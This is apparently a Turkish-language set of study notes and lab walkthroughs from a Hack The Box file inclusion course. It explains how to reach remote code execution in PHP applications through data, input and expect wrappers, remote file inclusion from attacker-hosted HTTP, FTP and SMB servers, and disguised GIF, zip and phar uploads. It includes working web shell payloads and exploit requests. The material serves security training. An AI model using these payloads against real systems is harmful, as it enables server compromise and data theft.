Remote komutları çalıştırmak için birçok yöntem kullanabiliriz, bunların her biri back-end diline/ framework'üne ve savunmasız fonksiyonun yeteneklerine bağlı olarak belirli bir kullanım durumuna sahiptir. Back-end sunucusu üzerinde kontrol sahibi olmak için kolay ve yaygın bir yöntem, kullanıcı kimlik bilgilerini ve SSH anahtarlarını numaralandırmak ve ardından bunları SSH veya başka bir remote oturum aracılığıyla back-end sunucusuna giriş yapmak için kullanmaktır. Örneğin, `config.php` gibi bir dosyada veritabanı şifresini bulabiliriz, bu da aynı şifreyi tekrar kullanmaları durumunda bir kullanıcının şifresiyle eşleşebilir. Ya da her kullanıcının ev dizinindeki `.ssh` dizinini kontrol edebiliriz ve okuma ayrıcalıkları düzgün bir şekilde ayarlanmamışsa, özel anahtarlarını (`id_rsa`) alabilir ve sisteme SSH yapmak için kullanabiliriz.

Bu tür önemsiz yöntemler dışında, veri numaralandırma veya local dosya ayrıcalıklarına dayanmadan doğrudan savunmasız fonksiyon aracılığıyla uzaktan kod yürütme elde etmenin yolları vardır. Bu bölümde, PHP web uygulamalarında remote code execution ile başlayacağız. Önceki bölümde öğrendiklerimiz üzerine inşa edeceğiz ve remote code execution elde etmek için farklı `PHP Wrappers` kullanacağız.


## **Data**

[Veri](“https://www.php.net/manual/en/wrappers.data.php”) wrapper'ı, PHP kodu da dahil olmak üzere dış verileri dahil etmek için kullanılabilir. Ancak, data wrapper'ları PHP yapılandırmalarında (`allow_url_include`) ayarı etkinleştirilmişse kullanılabilir. Bu nedenle, öncelikle LFI güvenlik açığı aracılığıyla PHP yapılandırma dosyasını okuyarak bu ayarın etkin olup olmadığını doğrulayalım.


#### **PHP Yapılandırmalarını Kontrol Etme**  

Bunu yapmak için, Apache için (`/etc/php/X.Y/apache2/php.ini`) veya Nginx için (`/etc/php/X.Y/fpm/php.ini`) adresinde bulunan PHP yapılandırma dosyasını kullanabiliriz, burada `X.Y` yüklediğiniz PHP sürümüdür. En son PHP sürümü ile başlayabilir ve yapılandırma dosyasını bulamazsak daha önceki sürümleri deneyebiliriz. Ayrıca önceki bölümde kullandığımız `base64` filtresini kullanacağız, çünkü `.ini` dosyaları `.php` dosyalarına benzer ve bozulmayı önlemek için kodlanmalıdır. Son olarak, çıktı stringi çok uzun olabileceğinden ve bunu düzgün bir şekilde yakalayabilmemiz gerektiğinden, tarayıcı yerine cURL veya Burp kullanacağız:

```shell-session
M1R4CKCK@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

Base64 kodlu stringi aldıktan sonra, kodunu çözebilir ve değerini görmek için `allow_url_include` için `grep` yapabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

Bu seçeneğin etkin olduğunu görüyoruz, böylece `data` wrapper'ı kullanabiliriz. `allow_url_include` seçeneğinin nasıl kontrol edileceğini bilmek çok önemli olabilir, çünkü `bu seçenek varsayılan olarak etkin değildir` ve daha sonra göreceğimiz gibi `input` wrapper kullanımı veya herhangi bir RFI saldırısı gibi diğer birçok LFI saldırısı için gereklidir. Örneğin bazı WordPress eklentileri ve temaları gibi birçok web uygulaması düzgün çalışması için bu seçeneğe ihtiyaç duyduğundan, bu seçeneğin etkin olduğunu görmek nadir değildir.


#### **Remote Code Execution**  

`allow_url_include` etkinleştirildiğinde, `data` wrapper saldırımıza devam edebiliriz. Daha önce de belirtildiği gibi, `data` wrapper PHP kodu da dahil olmak üzere dış verileri dahil etmek için kullanılabilir. Ayrıca, `text/plain;base64` ile `base64` kodlu stringler iletebiliriz ve bunları çözme ve PHP kodunu çalıştırma yeteneğine sahiptir.  

Dolayısıyla, ilk adımımız aşağıdaki gibi temel bir PHP web shell'ini base64 kodlamak olacaktır:

```shell-session
M1R4CKCK@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Şimdi, base64 stringini URL ile kodlayabilir ve ardından data `://text/plain;base64`, ile data wrapper'a aktarabiliriz. Son olarak, `&cmd=<COMMAND>` ile komutları web shell'e aktarabiliriz:

![Pasted image 20241118015018.png](/img/user/resimler/Pasted%20image%2020241118015018.png)

Aynı saldırı için aşağıdaki gibi cURL de kullanabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## **Input**  

`Data` wrapper'a benzer şekilde, input wrapper da dışarıdan girdi eklemek ve PHP kodunu çalıştırmak için kullanılabilir. `Data` wrapper ile arasındaki fark, girdimizi `input` wrapper'a bir POST isteğinin verisi olarak aktarmamızdır. Dolayısıyla, bu saldırının çalışması için savunmasız parametrenin POST isteklerini kabul etmesi gerekir. Son olarak, `input` wrapper da daha önce belirtildiği gibi `allow_url_include` ayarına bağlıdır.

Daha önceki saldırımızı input wrapper ile tekrarlamak için, savunmasız URL'ye bir POST isteği gönderebilir ve web shell'imizi POST verisi olarak ekleyebiliriz. Bir komut çalıştırmak için, daha önceki saldırımızda yaptığımız gibi bunu bir GET parametresi olarak geçebiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Not:** Komutumuzu bir GET isteği olarak iletmek için, savunmasız işlevin GET isteğini de kabul etmesi gerekir (yani `$_REQUEST` kullanın). Yalnızca POST isteklerini kabul ediyorsa, komutumuzu dinamik bir web shell yerine doğrudan PHP kodumuza koyabiliriz (örneğin `<\?php system('id')?>`)

## **Expect**  

Son olarak, komutları URL akışları üzerinden doğrudan çalıştırmamızı sağlayan [expect](“https://www.php.net/manual/en/wrappers.expect.php”) wrapper'ı kullanabiliriz. Expect, daha önce kullandığımız web shell'lere çok benzer şekilde çalışır, ancak komutları yürütmek için tasarlandığından bir web shell sağlamanıza gerek yoktur.  

Bununla birlikte, expect bir external wrapper'dır, bu nedenle back-end sunucusuna manuel olarak yüklenmesi ve etkinleştirilmesi gerekir, ancak bazı web uygulamaları temel fonksiyonları için ona güvenir, bu nedenle belirli durumlarda onu bulabiliriz. Daha önce `allow_url_include` ile yaptığımız gibi back-end sunucusunda yüklü olup olmadığını belirleyebiliriz, ancak bunun yerine `expect` için `grep` yaparız ve yüklü ve etkinse aşağıdakileri elde ederiz:

```shell-session
M1R4CKCK@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

Gördüğümüz gibi, `extension` configuration anahtar sözcüğü `expect` modülünü etkinleştirmek için kullanılıyor, bu da LFI açığı üzerinden RCE elde etmek için kullanabilmemiz gerektiği anlamına geliyor. expect modülünü kullanmak için, `expect://` wrapper'ı kullanabilir ve ardından çalıştırmak istediğimiz komutu aşağıdaki gibi iletebiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Gördüğümüz gibi, `expect` modülü aracılığıyla komutları yürütmek oldukça basittir, çünkü bu modül daha önce de belirtildiği gibi komut yürütme için tasarlanmıştır. [Web Saldırıları](“https://academy.hackthebox.com/module/details/134”) modülü ayrıca `expect` modülünün XXE güvenlik açıkları ile kullanımını da kapsar, bu nedenle burada nasıl kullanılacağını iyi anladıysanız, XXE ile kullanmak için hazır olmalısınız.  

Bunlar, LFI güvenlik açıkları aracılığıyla sistem komutlarını doğrudan çalıştırmak için en yaygın üç PHP wrapper'ıdır. İlerleyen bölümlerde `phar` ve `zip` wrapper'larını da ele alacağız, bunları dosya yüklemelerinin LFI güvenlik açıkları yoluyla uzaktan yürütme kazanmasına izin veren web uygulamalarıyla kullanabiliriz.

Soru : PHP wrappers'lardan birini kullanarak RCE elde etmeye çalışın ve / adresindeki bayrağı okuyun

Cevap : 

1- Öncelikle allow_url_include özelliği aktifmi onu tespit edelim .

![Pasted image 20241118020217.png](/img/user/resimler/Pasted%20image%2020241118020217.png)

![Pasted image 20241118020229.png](/img/user/resimler/Pasted%20image%2020241118020229.png)

2- Base64 formatında bir webshell oluşturuyoruz.

![Pasted image 20241118020245.png](/img/user/resimler/Pasted%20image%2020241118020245.png)

3- WebShell’imizi aktaralım .

```shell-session
http://83.136.254.199:38194/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```


![Pasted image 20241118020429.png](/img/user/resimler/Pasted%20image%2020241118020429.png)

4- Root dizininde ls komutunu çalıştıralım → ls /

![Pasted image 20241118020443.png](/img/user/resimler/Pasted%20image%2020241118020443.png)

5- İlginç bir txt uzantılı dosya görüyoruz cat ile okuyalım .

![Pasted image 20241118020449.png](/img/user/resimler/Pasted%20image%2020241118020449.png)


# **Uzak Dosya Ekleme (RFI)**  

Bazı durumlarda, savunmasız fonksiyon remote URL'lerin dahil edilmesine izin veriyorsa, remote dosyaları da "[Remote File Inclusion (RFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)" dahil edebiliriz. Bu, iki ana fayda sağlar:  

1. Yalnızca local portları ve web uygulamalarını numaralandırma (örn. SSRF)  
    
2. Barındırdığımız kötü amaçlı bir komut dosyasını dahil ederek uzaktan kod yürütme elde etme


## **Local vs. Remote File Inclusion**  

Güvenlik açığı bulunan bir fonksiyon remote dosyaları dahil etmemize izin verdiğinde, kötü amaçlı bir komut dosyası barındırabilir ve ardından kötü amaçlı fonksiyonları çalıştırmak ve remote code execution elde etmek için güvenlik açığı bulunan sayfaya dahil edebiliriz. İlk bölümdeki tabloya bakarsak, aşağıdakilerin (güvenlik açığı varsa) RFI'ye izin verecek işlevlerden bazıları olduğunu görürüz:

![Pasted image 20241118020803.png](/img/user/resimler/Pasted%20image%2020241118020803.png)



Gördüğümüz gibi, neredeyse tüm RFI güvenlik açıkları aynı zamanda bir LFI güvenlik açığıdır, çünkü remote URL'leri dahil etmeye izin veren herhangi bir fonksiyon genellikle local olanları da dahil etmeye izin verir. Bununla birlikte, bir LFI mutlaka bir RFI olmayabilir. Bunun başlıca üç nedeni vardır:


1. Güvenlik açığı bulunan fonksiyon uzak URL'lerin eklenmesine izin vermeyebilir  
    
2. Protokol wrapper'ının tamamını değil sadece dosya adının bir kısmını kontrol edebilirsiniz (örn: `http://`, `ftp://`, `https://`).  
    
3. Çoğu modern web sunucusu varsayılan olarak remote dosyaları dahil etmeyi devre dışı bıraktığından, yapılandırma RFI'yi tamamen engelleyebilir.


Ayrıca, yukarıdaki tabloda da belirtildiği üzere, bazı fonksiyonlar remote URL'leri dahil etmeye izin vermekte ancak kod çalıştırmaya izin vermemektedir. Bu durumda, SSRF aracılığıyla local portları ve web uygulamalarını listelemek için güvenlik açığından yararlanmaya devam edebiliriz.


## **RFI'yi doğrulayın**  

Çoğu dilde, uzak URL'leri dahil etmek, bu tür güvenlik açıklarına izin verebileceğinden tehlikeli bir uygulama olarak kabul edilir. Bu nedenle remote URL inclusion genellikle varsayılan olarak devre dışı bırakılır. Örneğin, PHP'de herhangi bir remote URL inclusion `allow_url_include` ayarının etkinleştirilmesini gerektirir. Bu ayarın etkin olup olmadığını önceki bölümde yaptığımız gibi LFI aracılığıyla kontrol edebiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

Ancak bu her zaman güvenilir olmayabilir çünkü bu ayar etkin olsa bile, güvenlik açığı bulunan fonksiyon başlangıçta uzaktan URL eklenmesine izin vermeyebilir. Bu nedenle, bir LFI güvenlik açığının RFI'ye karşı da savunmasız olup olmadığını belirlemenin daha güvenilir bir yolu, `bir URL eklemeyi denemek` ve içeriğini alıp alamayacağımızı görmektir. İlk olarak, girişimimizin bir güvenlik duvarı veya diğer güvenlik önlemleri tarafından engellenmediğinden emin olmak için `her zaman lokal bir URL eklemeye çalışarak başlamalıyız`. Öyleyse, girdi dizemiz olarak`(http://127.0.0.1:80/index.php`) kullanalım ve dahil edilip edilmediğini görelim:

![Pasted image 20241118021132.png](/img/user/resimler/Pasted%20image%2020241118021132.png)

Gördüğümüz gibi, `index.php` sayfası savunmasız bölüme (yani History Açıklaması) dahil edilmiştir, bu nedenle URL'leri dahil edebildiğimiz için sayfa gerçekten de RFI'ya karşı savunmasızdır. Ayrıca, `index.php` sayfası kaynak kod metni olarak dahil edilmedi, ancak PHP olarak yürütüldü ve işlendi, bu nedenle savunmasız işlev PHP yürütmesine de izin veriyor, bu da makinemizde barındırdığımız kötü amaçlı bir PHP betiğini dahil edersek kod yürütmemize izin verebilir.  

Ayrıca `80` numaralı portu belirtebildiğimizi ve web uygulamasını bu porttan alabildiğimizi görüyoruz. Eğer arka backend'i başka local web uygulamaları barındırıyorsa (örneğin port `8080`), SSRF tekniklerini uygulayarak RFI güvenlik açığı yoluyla bunlara erişebiliriz.

Not: Güvenlik açığı olan sayfanın kendisini (yani index.php) dahil etmek ideal olmayabilir, çünkü bu recursive bir dahil etme döngüsüne neden olabilir ve arka backend'e DoS'a neden olabilir.

### RFI ile Remote Code Execution
Remote code execution elde etmenin ilk adımı, web uygulamasının dilinde (bu durumda PHP) kötü niyetli bir script oluşturmaktır. İnternetten indirdiğimiz özel bir web shell'i kullanabilir, bir reverse shell script kullanabilir ya da önceki bölümde yaptığımız gibi kendi temel web shell'imizi yazabiliriz, ki bu durumda yapacağımız şey de budur:

```shell-session
M1R4CKCK@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Şimdi tek yapmamız gereken bu scripti barındırmak ve RFI güvenlik açığı üzerinden dahil etmektir. Güvenlik açığı bulunan web uygulamasının giden bağlantıları engelleyen bir güvenlik duvarına sahip olması durumunda bu portlar beyaz listeye alınmış olabileceğinden, 80 veya 443 gibi yaygın bir HTTP portunu dinlemek iyi bir fikirdir. Ayrıca, daha sonra göreceğimiz gibi, betiği bir FTP servisi veya bir SMB servisi aracılığıyla barındırabiliriz.



### HTTP
Şimdi aşağıdaki komut ile makinemizde temel bir python sunucusu ile aşağıdaki gibi bir sunucu başlatabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```

Şimdi, daha önce yaptığımız gibi RFI aracılığıyla local shell'imizi dahil edebiliriz, ancak <OUR_IP> ve <LISTENING_PORT>'umuzu kullanarak. Ayrıca &cmd=id ile çalıştırılacak komutu da belirteceğiz:

![Pasted image 20241118021612.png](/img/user/resimler/Pasted%20image%2020241118021612.png)

Gördüğümüz gibi, python sunucumuzda bir bağlantı elde ettik ve remote shell dahil edildi ve belirtilen komutu çalıştırdık:

```shell-session
M1R4CKCK@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...

SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
```

İpucu: İsteğin belirttiğimiz şekilde gönderildiğinden emin olmak için makinemizdeki bağlantıyı inceleyebiliriz. Örneğin, isteğe fazladan bir uzantı (.php) eklendiğini görürsek, bunu payload'umuzdan çıkarabiliriz


### FTP
Daha önce de belirtildiği gibi, betiğimizi FTP protokolü aracılığıyla da barındırabiliriz. Python'un pyftpdlib'i ile aşağıdaki gibi temel bir FTP sunucusu başlatabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ sudo python -m pyftpdlib -p 21

[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```

Bu, http portlarının bir güvenlik duvarı tarafından engellenmesi veya http:// stringinin bir WAF tarafından engellenmesi durumunda da yararlı olabilir. Scriptimizi eklemek için, daha önce yaptığımızı tekrarlayabiliriz, ancak URL'de ftp:// şemasını aşağıdaki gibi kullanabiliriz:

![Pasted image 20241118021714.png](/img/user/resimler/Pasted%20image%2020241118021714.png)

Gördüğümüz gibi, bu http saldırımıza çok benzer şekilde çalıştı ve komut çalıştırıldı. PHP varsayılan olarak anonim bir kullanıcı olarak kimlik doğrulaması yapmaya çalışır. Eğer sunucu geçerli bir kimlik doğrulaması gerektiriyorsa, kimlik bilgileri URL'de aşağıdaki gibi belirtilebilir:

```shell-session
M1R4CKCK@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


### SMB
Savunmasız web uygulaması bir Windows sunucusunda barındırılıyorsa (HTTP yanıt başlıklarındaki sunucu sürümünden anlayabiliriz), remote file inclusion için SMB protokolünü kullanabileceğimizden, RFI exploit için allow_url_include ayarının etkinleştirilmesine gerek yoktur. Bunun nedeni Windows'un uzak SMB sunucularındaki dosyaları UNC yolu ile doğrudan başvurulabilen normal dosyalar olarak değerlendirmesidir.

Varsayılan olarak anonim kimlik doğrulamasına izin veren Impacket'in smbserver.py dosyasını kullanarak aşağıdaki gibi bir SMB sunucusu oluşturabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```


Şimdi, bir UNC yolu kullanarak (örneğin \\<OUR_IP>\share\shell.php) scriptimizi ekleyebilir ve komutu daha önce yaptığımız gibi (&cmd=whoami) ile belirtebiliriz:

![Pasted image 20241118021826.png](/img/user/resimler/Pasted%20image%2020241118021826.png)

Gördüğümüz gibi, bu saldırı remote script'imiz de dahil olmak üzere çalışmaktadır ve varsayılan olmayan ayarların etkinleştirilmesine gerek yoktur. Ancak, Windows sunucu yapılandırmalarına bağlı olarak internet üzerinden remote SMB sunucularına erişim varsayılan olarak devre dışı bırakılmış olabileceğinden, aynı ağ üzerindeysek bu tekniğin işe yarama olasılığının daha yüksek olduğunu belirtmeliyiz.

Soru : Hedefe saldırın, RFI güvenlik açığından yararlanarak komut yürütme elde edin ve ardından / dizinlerinden birinin altındaki bayrağı arayın.
Cevap : 

1- Öncelikle web sunucumuzu başlatalım

`sudo python3 -m http.server 443`

2- Web shelimizi oluşturalım . ( Bir sorun cıkmaması için web shell’imizi /var/www/html/ yoluna koyalım bu python sunucumuzun çalıştığı konum)

![Pasted image 20241118022027.png](/img/user/resimler/Pasted%20image%2020241118022027.png)

3 - id komutunu çalıştıralım hedef sistemde . Web shellimizin çalışıp çalışmadığını anlamak için

![Pasted image 20241118022129.png](/img/user/resimler/Pasted%20image%2020241118022129.png)

![Pasted image 20241118022135.png](/img/user/resimler/Pasted%20image%2020241118022135.png)

4- Komutumuz çalıştı ls / ile flag dosyamızı arayabiliriz fakat daha kolay yolu find komutu ile dosyamızın adresini bulmaktır .

![Pasted image 20241118022150.png](/img/user/resimler/Pasted%20image%2020241118022150.png)

![Pasted image 20241118022153.png](/img/user/resimler/Pasted%20image%2020241118022153.png)

5- Flag dosyasının yerini öğrendik son olarak cat ile okuma işlemini yapalım ve sorumuzu cevaplayalım .

![Pasted image 20241118022159.png](/img/user/resimler/Pasted%20image%2020241118022159.png)

# LFI and File Uploads

İlk bölümde belirtildiği gibi, aşağıdakiler dosya ekleme ile kod çalıştırmaya izin veren fonksiyonlardır ve bunlardan herhangi biri bu bölümdeki saldırılarla çalışabilir:

![Pasted image 20241118023545.png](/img/user/resimler/Pasted%20image%2020241118023545.png)

### Resim yükleme
Çoğu modern web uygulamasında resim yükleme çok yaygındır, çünkü yükleme işlevi güvenli bir şekilde kodlanmışsa resim yüklemek yaygın olarak güvenli kabul edilir. Ancak, daha önce de belirtildiği gibi, bu durumda güvenlik açığı dosya yükleme formunda değil, dosya ekleme işlevindedir.

### **Zararlı Görsel Oluşturma**  
İlk adımımız, PHP web shell kodu içeren, ancak hala bir görsel gibi görünen ve çalışan bir zararlı görsel oluşturmaktır. Bunun için dosya ismimizde izin verilen bir görsel uzantısı kullanacağız (örneğin, `shell.gif`) ve ayrıca dosya içeriğinin başına görselin magic byte değerlerini (örneğin, `GIF8`) ekleyeceğiz. Bu, yükleme formu hem uzantıyı hem de içerik türünü kontrol ediyorsa işe yarayacaktır. Bunu şu şekilde yapabiliriz:


```shell-session
M1R4CKCK@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Bu dosya tek başına tamamen zararsızdır ve normal web uygulamalarını en ufak bir şekilde etkilemez. Ancak, bunu bir LFI açığı ile birleştirirsek, uzaktan kod çalıştırmaya ulaşabiliriz.  

**Not:** Bu durumda bir `GIF` resmi kullanıyoruz çünkü magic baytları ASCII karakterleri olduğu için kolayca yazılabilirken, diğer uzantılarda URL kodlamamız gereken binary olarak magicv baytlar vardır. Ancak, bu saldırı izin verilen herhangi bir görüntü veya dosya türüyle çalışabilir.

Şimdi, kötü amaçlı resim dosyamızı yüklememiz gerekiyor. Bunu yapmak için, `Profile Settings` sayfasına gidebilir ve avatar resmine tıklayarak resmimizi seçebilir ve ardından upload'a tıklayabiliriz ve resmimiz başarıyla yüklenmelidir:

![Pasted image 20241118023924.png](/img/user/resimler/Pasted%20image%2020241118023924.png)

#### **Yüklenen Dosya Yolu**  

Dosyamızı yükledikten sonra, tek yapmamız gereken LFI güvenlik açığı aracılığıyla onu dahil etmektir. Yüklenen dosyayı dahil etmek için, yüklenen dosyamızın yolunu bilmemiz gerekir. Çoğu durumda, özellikle resimlerde, yüklediğimiz dosyaya erişebiliriz ve URL'sinden yolunu alabiliriz. Bizim durumumuzda, resmi yükledikten sonra kaynak kodunu incelersek, URL'sini alabiliriz:

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

**Not:** Gördüğümüz gibi, dosya yolu için `/profile_images/shell.gif` kullanabiliriz. Dosyanın nereye yüklendiğini bilmiyorsak, o zaman bir uploads dizini için fuzz yapabilir ve ardından yüklenen dosyamız için fuzz yapabiliriz, ancak bazı web uygulamaları yüklenen dosyaları düzgün bir şekilde gizlediğinden bu her zaman işe yaramayabilir.  

Yüklenen dosya yolu elimizdeyken, tek yapmamız gereken yüklenen dosyayı LFI savunmasız fonksiyonuna dahil etmektir ve PHP kodu aşağıdaki gibi çalıştırılmalıdır:

![Pasted image 20241118024013.png](/img/user/resimler/Pasted%20image%2020241118024013.png)

**Not:** Yüklediğimiz dosyayı dahil etmek için `./profile_images/` kullandık, çünkü bu durumda LFI güvenlik açığı girdimizin önüne herhangi bir dizin eklemiyor. Girdimizin önüne bir dizin eklemesi durumunda, önceki bölümlerde öğrendiğimiz gibi, bu dizinden ./ dizinini çıkarmamız ve ardından URL yolumuzu kullanmamız yeterlidir `.`

## **Zip Upload**  

Daha önce de belirtildiği gibi, yukarıdaki teknik çok güvenilirdir ve savunmasız fonksiyon kod yürütülmesine izin verdiği sürece çoğu durumda ve çoğu web framework'ünde çalışmalıdır. Aynı amaca ulaşmak için PHP wrapper'larını kullanan sadece PHP'ye özel birkaç teknik daha vardır. Bu teknikler, yukarıdaki tekniğin işe yaramadığı bazı özel durumlarda kullanışlı olabilir.  

PHP kodunu çalıştırmak için [zip](“https://www.php.net/manual/en/wrappers.compression.php”) wrapper'ı kullanabiliriz. Ancak, bu wrapper varsayılan olarak etkin değildir, bu nedenle bu yöntem her zaman çalışmayabilir. Bunu yapmak için, bir PHP web shell script oluşturarak ve bunu aşağıdaki gibi bir zip arşivine ( `shell.jpg` adlı) sıkıştırarak başlayabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

**Not:** Zip arşivimizi (shell.jpg) olarak adlandırmamıza rağmen, bazı yükleme formları content-type testleri aracılığıyla dosyamızı zip arşivi olarak algılayabilir ve yüklenmesine izin vermeyebilir, bu nedenle zip arşivlerinin yüklenmesine izin veriliyorsa bu saldırının çalışma şansı daha yüksektir.

`shell.jpg` arşivini yükledikten sonra, bunu (`zip://shell.jpg`) şeklinde zip wrapper'a dahil edebilir ve ardından içindeki herhangi bir dosyaya `#shell.php` (URL kodlu) ile başvurabiliriz. Son olarak, `&cmd=id` ile her zaman yaptığımız gibi komutları aşağıdaki gibi çalıştırabiliriz:

![Pasted image 20241118024236.png](/img/user/resimler/Pasted%20image%2020241118024236.png)

Gördüğümüz gibi, bu yöntem sıkıştırılmış PHP scriptleri aracılığıyla komut çalıştırmada da işe yaramaktadır.  

**Not:** Savunmasız sayfa (`index.php`) ana dizinde olduğu için dosya adından önce uploads dizinini (`./profile_images/`) ekledik.


## **Phar Yükleme**  

Son olarak, benzer bir sonuç elde etmek için `phar://` wrapper'ı kullanabiliriz. Bunu yapmak için öncelikle aşağıdaki PHP scriptini bir `shell.php` dosyasına yazacağız:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Bu script, çağrıldığında etkileşime girebileceğimiz bir `shell.txt` alt dosyasına bir web shell yazacak bir `phar` dosyasına derlenebilir. Bunu bir `phar` dosyasına derleyebilir ve aşağıdaki gibi `shell.jpg` olarak yeniden adlandırabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Şimdi, `shell.jpg` adında bir phar dosyamız olmalıdır. Bunu web uygulamasına yükledikten sonra, basitçe `phar://` ile çağırabilir ve URL yolunu sağlayabilir ve ardından aşağıdaki gibi (`&cmd=id`) ile belirttiğimiz komutun çıktısını almak için `/shell.txt` (URL kodlu) ile phar alt dosyasını belirtebiliriz:

![Pasted image 20241118024408.png](/img/user/resimler/Pasted%20image%2020241118024408.png)

Gördüğümüz gibi `id` komutu başarıyla çalıştırıldı. Hem `zip` hem de `phar` wrapper yöntemleri, ilk yöntemin işe yaramaması durumunda alternatif yöntemler olarak düşünülmelidir, çünkü bahsettiğimiz ilk yöntem üçü arasında en güvenilir olanıdır.  

**Not:** PHP yapılandırmalarında dosya yüklemelerinin etkinleştirilmesi ve `phpinfo()` sayfasının bir şekilde bize açık olması durumunda ortaya çıkan, kayda değer (eski) bir LFI/uploads saldırısı daha vardır. Ancak, bu saldırı çok yaygın değildir, çünkü çalışması için çok özel gereksinimleri vardır (LFI + uploads etkin + eski PHP + açık phpinfo()). Bu konuda daha fazla bilgi edinmek istiyorsanız,[This Link](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo). başvurabilirsiniz.

Soru : RCE elde etmek için bu bölümde ele alınan tekniklerden herhangi birini kullanın ve / adresindeki bayrağı okuyun.
Cevap : 

1- Öncelikle gif formatında bir web shell yazalım .

![Pasted image 20241118024549.png](/img/user/resimler/Pasted%20image%2020241118024549.png)


2- Hedef sisteme upload edelim.

![Pasted image 20241118024555.png](/img/user/resimler/Pasted%20image%2020241118024555.png)


3- Dosyamız nereye upload ediliyor tespit edelim . (Kaynak koda bak)

![Pasted image 20241118024604.png](/img/user/resimler/Pasted%20image%2020241118024604.png)

4- id komutunu çalıştıralım deneme amaçlı.

![Pasted image 20241118024611.png](/img/user/resimler/Pasted%20image%2020241118024611.png)

5- Root (/) dizininde ls çalıştırdık ve ilginç bir txt dosyasına ulaştık .

![Pasted image 20241118024620.png](/img/user/resimler/Pasted%20image%2020241118024620.png)

6- Dikkat etmeniz gereken nokta GIF8 yazan kısım bizim webshell kodumuzun içine koyduğumuz magic bayt’dır. Dosyamızı okuyalım ve bayrağı yakalayalım .

![Pasted image 20241118024632.png](/img/user/resimler/Pasted%20image%2020241118024632.png)


# Log Poisoning

Önceki bölümlerde PHP kodu içeren herhangi bir dosya eklediğimizde, savunmasız fonksiyonun `Execute` ayrıcalıklarına sahip olduğu sürece çalıştırılacağını gördük. Bu bölümde tartışacağımız saldırıların hepsi aynı konsepte dayanmaktadır: PHP kodunu kontrol ettiğimiz bir alana yazarak bir günlük dosyasına kaydetmek (yani günlük dosyasını `poison`/`contaminate`) ve ardından PHP kodunu çalıştırmak için bu günlük dosyasını dahil etmek. Bu saldırının işe yaraması için, PHP web uygulamasının günlüğe kaydedilen dosyalar üzerinde okuma ayrıcalıklarına sahip olması gerekir, bu da bir sunucudan diğerine değişir.

Önceki bölümde olduğu gibi, `Execute` ayrıcalıklarına sahip aşağıdaki işlevlerden herhangi biri bu saldırılara karşı savunmasız olmalıdır:

